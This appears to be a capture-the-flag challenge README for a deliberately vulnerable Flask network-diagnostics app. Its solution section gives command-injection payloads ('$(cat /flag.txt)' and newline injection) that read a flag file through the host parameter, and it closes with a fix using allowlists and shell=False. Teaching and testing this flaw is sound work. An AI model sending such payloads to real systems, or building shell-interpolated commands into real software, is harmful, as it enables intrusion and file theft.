# Command Injection — NetTools

A small "network diagnostics" Flask app that shells out to real
`ping` / `dig` with the user-supplied host name spliced into the
command string. A weak blacklist strips `;`, `|`, `&` — but lets
`$()`, backticks, and newlines through.

## Player target

Read `/flag.txt` via shell injection.

## Author solution sketch

```
GET /ping?host=1.1.1.1$(cat /flag.txt)
```

Renders:
```
$ ping -c 2 -W 2 1.1.1.1CTF{REDACTED}
ping: unknown host 1.1.1.1CTF{REDACTED}
```

The flag appears inline in the error output. Backticks work
identically. Newline-injection works too:

```
GET /ping?host=1.1.1.1%0acat%20/flag.txt
```

## Why this is the lesson

* Blacklists are guesses. Allowlists are policies. Validate the
  host against a real hostname regex (or pass it as a *separate
  argument* with `shell=False`) rather than filtering metachars.
* `subprocess.run(cmd, shell=True)` with f-string interpolation is
  always the wrong choice.
